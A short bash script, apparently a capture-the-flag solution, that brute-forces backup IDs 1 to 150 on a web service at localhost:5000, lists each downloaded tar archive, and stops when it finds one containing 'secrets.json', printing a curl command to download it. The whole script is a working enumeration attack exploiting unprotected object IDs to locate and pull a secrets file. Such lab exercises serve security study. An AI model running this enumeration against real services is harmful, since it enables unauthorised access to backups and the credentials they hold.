#!/bin/bash

echo "🕵️‍♂️ Searching for backup containing 'secrets.json'..."

# Loop through a range of possible backup IDs
for i in {1..150}; do
    # Download the archive, decompress it (-z), list its contents (-t),
    # and then check if 'secrets.json' is in the list.
    if curl -s "http://localhost:5000/backups/$i" | tar -zt | grep -q "secrets.json"; then
        echo "✅ Success! Found 'secrets.json' in backup ID: $i"
        echo "⬇️  Run 'curl http://localhost:5000/backups/$i -o backup${i}.tar.gz' to download it."
        # Exit the script once the flag is found
        exit 0
    else
        # Optional: Print progress so you know it's working
        echo "Checking ID $i..."
    fi
done

echo "❌ Could not find the backup within the specified range."
